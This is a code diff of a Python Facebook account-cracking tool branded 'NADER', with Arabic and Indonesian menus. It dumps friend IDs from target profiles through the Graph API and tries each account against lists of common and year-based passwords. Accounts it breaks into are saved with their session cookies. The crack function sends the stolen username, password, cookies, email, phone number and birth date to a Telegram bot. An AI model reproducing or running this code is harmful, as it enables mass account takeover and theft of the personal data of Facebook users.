-	print('\033[0;1m[ \033[31;1m3 \033[0;1m]  𝐕𝐈𝐏 - من ملف') 
-	print(f'═══════════════════════════════════════════════════════════════')
-	print('\033[0;1m[ \033[31;1m0 \033[0;1m] 𝐕𝐈𝐏 - الخروج من الحساب ☹')
+	print('\033[1;32m» 1- Fishing from friends : من الاصدقاء  ')
+	print('\033[1;32m» 2- Fishing from followers : من المتابعين ')
+	print('\033[1;32m» 3- Crack File : مــن مــلــف  ')		
+	print('\033[1;32m» 0- login out : تسجيل خروج   ')
 		
-	_____alvino__adijaya_____ = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] 𝐕𝐈𝐏 - اختر ماذا تريد  : ')
+	_____alvino__adijaya_____ = input('\033[1;32m\n[=] chose : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
 	elif _____alvino__adijaya_____ in ['2']:
@@ -746,46 +848,6 @@ def menu(my_name,my_id):
 	elif _____alvino__adijaya_____ in ['0']:
 		O()
 		exit()
-def public():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	try:
-		jum = int(input('[?] CRACK ID LIMIT : '))
-	except ValueError:
-		time.sleep(3)
-		print('{k}[✘] NOT PUBLIC ID ')
-		follower()
-	if jum<1:
-		print('[✘] Your limit error')
-		exit()
-	ses=requests.Session()
-	yz = 0
-	for met in range(jum):
-		yz+=1		
-		kl = input('[➤] INPUT PUBLIC '+str(yz)+' : ')
-		uid.append(kl)
-	for userr in uid:
-		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-			for mi in col['friends']['data']:
-				try:
-					iso = (mi['id']+'|'+mi['name'])
-					if iso in id:pass
-					else:id.append(iso)
-				except:continue
-			print('[•] Total Id :{h} '+str(len(id)))
-			setting()
-		except (KeyError,IOError):
-			print('[✘] Id Is Not Public')
-			time.sleep(3)
-			public()
-		except requests.exceptions.ConnectionError:
-			print('{k}[✘] Error Connection ')
-			exit()
-
 
 def follower():
 	try:
@@ -853,25 +915,28 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('>> Target Id ? عدد الايديات المستهدفه: '))
+		jum = int(input('» Number ID | عدد الايديات : '))
 	except ValueError:
-		print('>> Masukkan Angka Anjing, Malah Huruff ')
+		print('> Masukkan Angka Anjing, Malah Huruff ')
 		exit()
 	if jum<1 or jum>100:
-		print('>> Gagal Dump Idz ')
+		print('» Gagal Dump Idz ')
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
+		
 		yz+=1
-		kl = input('>> Id Target '+str(yz)+' : ')
+		kl = input('» ID  '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
 			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
 			for mi in col['friends']['data']:
+				
 				try:
 					iso = (mi['id']+'|'+mi['name'])
+					
 					if iso in id:pass
 					else:id.append(iso)
 				except:continue
@@ -883,8 +948,8 @@ def dump_massal():
 			print('>> Sinyal Loh Kurang Bagus ')
 			exit()
 	try:
-		print(f'═══════════════════════════════════════════════════════════════')
-		print(f'𝐕𝐈𝐏 - عددالايديات {h}'+str(len(id)))
+		print('')
+		print(f'» ID | عدد الايديات {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -896,11 +961,12 @@ def dump_massal():
 		back()
 
 def setting():
-	print(f'═══════════════════════════════════════════════════════════════')
-	print('\033[0;1m[ \033[31;1m1 \033[0;1m] 𝐕𝐈𝐏 - فحص ايديات قديمة \n\033[0;1m[ \033[31;1m2 \033[0;1m] 𝐕𝐈𝐏 - فحص ايديات جديده\n\033[0;1m[ \033[31;1m3 \033[0;1m] 𝐕𝐈𝐏 - فحص ايديات منوع')
-	hu = input('\n\033[0;1m[ \033[31;1m☠ \033[0;1m] 𝐕𝐈𝐏 - اختار ماذا تريد ')
+	print("\033[2;36m ~~~~~~~~~~~~~~~~~~~~~~~")
+	print(f'» 1- Id old | الاولويه في الفحص للحسابات القديمه')
+	print('» 2- Id New | الاولويه في الفحص للحسابات الجديده')
+	print('» 3- Old+new | قـديـمـه وجـديده ')
 	print('')
-	print(f'═══════════════════════════════════════════════════════════════')
+	hu = input('» Chose : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -921,9 +987,12 @@ def setting():
 	else:
 		print('>> PILIH YANG BENAR BANG ')
 		exit()
-	print('[ 1 ] 𝐕𝐈𝐏 - سريعة جداً\n[ 2 ] 𝐕𝐈𝐏 - بطيئ\n[ 3 ] 𝐕𝐈𝐏 - سريعة\n[ 4 ] 𝐕𝐈𝐏 - وسط')
-	print(f'═══════════════════════════════════════════════════════════════')
-	hc = input('♕[𝐕𝐈𝐏 - اختار ماذا تريد] ♕ ')
+	print('>> 1. Mobile ')
+#    print('>> 2. Mbasic ')
+#    print('>> 3. Touch  ')
+#    print('>> 4. Mtouch ')
+	print('')
+	hc = input('» Chose : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
@@ -977,13 +1046,10 @@ def passwrd():
 					pwv.append('1122334455')
 					pwv.append('123456')
 					pwv.append('1234512345')
-					pwv.append('12345@')
 					pwv.append('00998877')
-					pwv.append('11223344@@')
 					pwv.append('11223344')
 					pwv.append('11223344556677')
 					pwv.append('qqwweerr')
-					pwv.append('07700770')
 					pwv.append('19901990')
 					pwv.append('19911991')
 					pwv.append('19921992')
@@ -994,7 +1060,6 @@ def passwrd():
 					pwv.append('19971997')
 					pwv.append('19981998')
 					pwv.append('19991999')
-					pwv.append('20012001')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
@@ -1007,13 +1072,10 @@ def passwrd():
 					pwv.append('1122334455')
 					pwv.append('123456')
 					pwv.append('1234512345')
-					pwv.append('12345@')
 					pwv.append('00998877')
-					pwv.append('11223344@@')
 					pwv.append('11223344')
 					pwv.append('11223344556677')
 					pwv.append('qqwweerr')
-					pwv.append('07700770')
 					pwv.append('19901990')
 					pwv.append('19911991')
 					pwv.append('19921992')
@@ -1024,7 +1086,6 @@ def passwrd():
 					pwv.append('19971997')
 					pwv.append('19981998')
 					pwv.append('19991999')
-					pwv.append('20012001')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
@@ -1049,7 +1110,7 @@ def passwrd():
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t{x}<>{k} Good Bye {x} <> ')
+		print(f'\t{x}[=]{k} Been completed {x} <> ')
 		time.sleep(2)
 		exit()
 
@@ -1059,7 +1120,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s{ [VIB] %s/%s $ [OK] %s $ [CP] %s .. } %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s <NADER> %s/%s » [OK] %s » [CP] %s » %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
@@ -1077,9 +1138,13 @@ def crack(idf,pwv):
 					ceker(idf,pw)
 				else:
 					print('\n')
-					statuscp = f'''CP
-[NADER] {idf}   •   {pw}
-'''
+					statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️
+⋘─────━𓆩NADER𓆪‏━─────⋙
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+⋘─────━𓆩NADER𓆪‏━─────⋙
+@nader20090  -  @N_0_N_7					
+					'''
 					statuscp1 = nel(statuscp, style='red')
 					cetak(nel(statuscp1, title='SESI'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1095,9 +1160,13 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
-					statusok = f'''GOOD
-[G O O D • NADER] 𝐕𝐈𝐏 - الايدي : {idf}\n[ ≤ ] 𝐕𝐈𝐏 - الباسورد : {pw}\n[ ≤ ] 𝐕𝐈𝐏 - الكوكيز : {kuki}')
-'''
+					statusok = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✔️
+⋘─────━𓆩NADER𓆪‏━─────⋙
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
+⋘─────━𓆩NADER𓆪‏━─────⋙
+@nader20090  -  @N_0_N_7					
+					'''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title=' NO SESI'))
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
@@ -1133,8 +1202,10 @@ def crack(idf,pwv):
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += f'''GOOD
-[G O O D • NADER] 𝐕𝐈𝐏 - الايدي : {idf}\n[ ≤ ] 𝐕𝐈𝐏 - الباسورد : {pw}\n[ ≤ ] 𝐕𝐈𝐏 - الكوكيز : {kuki}'''
+					infoakun += f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺
+⋘─────━𓆩NADER𓆪‏━─────⋙
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n⋘─────━𓆩NADER𓆪‏━─────⋙
+@nader20090  -  @N_0_N_7'''
 					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
 
 					hit1, hit2 = 0,0
